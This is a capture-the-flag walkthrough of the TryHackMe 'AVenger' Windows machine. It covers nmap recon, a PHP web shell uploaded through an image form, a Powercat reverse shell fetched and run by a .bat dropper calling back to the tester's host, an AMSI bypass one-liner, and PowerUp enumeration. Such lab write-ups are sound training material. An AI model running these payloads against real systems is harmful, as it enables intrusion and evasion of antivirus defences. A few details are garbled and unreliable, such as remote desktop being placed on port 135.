--- 
title: "AVenger Writeup" 
date: 2023-11-29 00:00 +0000 
categories: [Tryhackme, EJPT]
tags: [CTFs, Hack the box, personal blog, WriteUP,ctf, Tryhackme, hackthebox, webshell, sudo, ejpt-like] 
author: Fabb05 
image:
  path: https://raw.githubusercontent.com/FabV05/files/main/AVenger/Portada.png
  alt: img of the machine
---

# AVenger Writeup

## Machine information

| Feature  | AVenger |
| :------------: | :--: |
| Release Date:  | 24 november 2023 |
| Retire Date:   | N/A |
| Difficulty:    | Medium |


# Information Recon

## Nmap Summary

Scanning the target via nmap tool, I discover the following ports and their services, that include HTTP, HTTPS, MySQL, etc.:

```bash
PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.5K  2022-06-15 16:07  applications.html
| 177   2022-06-15 16:07  bitnami.css
| -     2023-04-06 09:24  dashboard/
| 30K   2015-07-16 15:32  favicon.ico
| -     2023-06-27 09:26  gift/
| -     2023-06-27 09:04  img/
| 751   2022-06-15 16:07  img/module_table_bottom.png
| 337   2022-06-15 16:07  img/module_table_top.png
| -     2023-06-28 14:39  xampp/
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Index of /
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp67
open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.5K  2022-06-15 16:07  applications.html
| 177   2022-06-15 16:07  bitnami.css
| -     2023-04-06 09:24  dashboard/
| 30K   2015-07-16 15:32  favicon.ico
| -     2023-06-27 09:26  gift/
| -     2023-06-27 09:04  img/
| 751   2022-06-15 16:07  img/module_table_bottom.png
| 337   2022-06-15 16:07  img/module_table_top.png
| -     2023-06-28 14:39  xampp/
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack
3306/tcp  open  mysql         syn-ack MySQL 5.5.5-10.4.28-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.28-MariaDB
|   Thread ID: 10
|   Capabilities flags
```

Analyzing the result, i determinate that de machine is a Windows server 2019. Notably, on port 80, there are three distinct applications: 'applications.html,' 'dashboard,' and 'gift” , so that’s my first target.

## Port 80/443 Apache (WordPress, Drupal, Joomla! and dozens)

First of all, the IP automatically redirects to the index of the web, essentially leading to the main breach of the port:

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/Index.png)

Consequently, in the applications.html, I got an information of the machine, some of those are important, but I can't do much with them 

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/phpinfo.png)

Alright, time to kick it up a notch with the good GoBuster scan! Gonna give that port a closer look and see what it's really hiding. Let the hunting begin!

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/gobuster.png)

First impression, 'Oh, a typical WordPress site,' right? Well, not quite! Digging deeper, I found myself at the 'gift' page, but here is the catch I need to put the domain in the /etc/hosts on my Guess OS

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/domain.png)

Then, the page load correctly so I analyzed it and found a curious form that receive a file

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/form.png)

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/luna.png)

So, put a friendly pic and got a message back! Looks like someone on the admin side took a peek at the image

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/form1.png)

Alright, now to confirm if it's what we're thinking, I'll create an image that accesses my website to check if we get any signal. It is time to put our theories in test!

```bash
sudo python3 -m http.server  80

echo '<?php system($_REQUEST['server/imagen-dibujos-animados-hongo-palabra-hongo_587001-200.png']); ?>' >> img.png
```

Got signal, but I got a problem. I need to evade the windows defender because the defender will block my revershell and probably block me 

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/respuesta.png)

## Road 2 hugo

For a better comprehension, this is a little sniff in the windows defender configuration on the machine:

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/defender1.png)

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/defender2.png)

Alright, following the playbook from the article, let's install Powercat (https://github.com/besimorhino/powercat) then write the followings commands after use python3 and NC in the port that you just select

[Evade Windows Defender reverse shell detection with Powercat](https://systemweakness.com/evade-windows-defender-reverse-shell-detection-6fa9f5eee1d1)

```bash
1)LHOST=10.2.87.109   
LPORT=9999
rshell=shell-443.txt
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > $rshell

2)LHOST=10.2.87.109   
LPORT_web=80
rshell=shell-443.txt
echo START /B powershell -c "\$code=(New-Object System.Net.Webclient).DownloadString('http://${LHOST}:${LPORT_web}/${rshell}');iex 'powershell -E \$code'" > backup.bat

3) python3 -m http.server 80

4) rlwrap nc -nlvp 9999
```

Now, let’s complete one more time the form nonetheless with the .bat file 

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/respuesta2.png)

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/hugoshell.png)

WE GOT HUGO SHELL 

---

## Privilege Escalation

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/grupos.png)

I see that `hugo` is part of the administrator group, now let's check if UAC is present.

> User Account Control (UAC) is a key part of Windows security. UAC reduces the risk of malware by limiting the ability of malicious code to execute with administrator privileges.
> 

```bash
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5 = default
```

To further enumerate the target on how to bypass the UAC or find other ways to escalate privileges, we want to make use of `PowerUp.ps1`. Since the target is still under AV protection, we try to bypass it. Especially the Antimalware Scan Interface (AMSI).

Now, I should use the PowerUp.ps1 because the target machine has the windows defender activated. Gotta bypass that pesky Antimalware Scan Interface (AMSI) because it's blocking file downloads.
> The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.
> 

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/explicacion.png)

[AMSI Bypass Methods](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/?utm_source=gitbook&utm_medium=iframely)

[](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)

For that i’ll use “**[Fabian Mosch](https://twitter.com/ShitSecure)** used an old AMSI bypass of **[Matt Graeber](https://twitter.com/mattifestation)** to prove that if base64 encoding is used on strings (AmsiUtils & amsiInitFailed) that trigger AMSI and decoded at runtime could be used as an evasion defeating the signatures of Microsoft. This technique prevents AMSI scanning capability for the current process by setting the “amsiInitFailed” flag.”

```bash
1) [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

2) (New-Object System.Net.Webclient).DownloadString('http://10.2.87.109/PowerUp.ps1') > PowerUp.ps1

3) . .\Powerup.ps1

4) Invoke-AllChecks

```

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/contrase%C3%B1a.png)

Got it, identified that Hugo is rocking the admin privileges. According to the write-up I checked out, the easiest route is firing up Remmina with the user and password to access via 135/tcp - where the remote desktop action is going down.

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/final1.png)

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/final2.png)

![alt text](https://raw.githubusercontent.com/FabV05/files/main/AVenger/final3.png)

## Conclusion

The AVenger(Thm) machine presented a challenging scenario with multiple services and applications running on different ports. The initial reconnaissance using Nmap revealed a Windows Server 2019 with various open ports, including HTTP, HTTPS, MSRPC, NetBIOS, and MySQL. The web server on port 80 exhibited interesting directories like 'applications,' 'dashboard,' and 'gift.'

Further exploration of the web server uncovered a unique form on the 'gift' page that accepted image files. Exploiting this, a web shell was successfully implanted using a crafted image. However, the real challenge arose when Windows Defender blocked the reverse shell. To overcome this, the attacker leveraged Powercat and evasion techniques to bypass Windows Defender, achieving a successful reverse shell.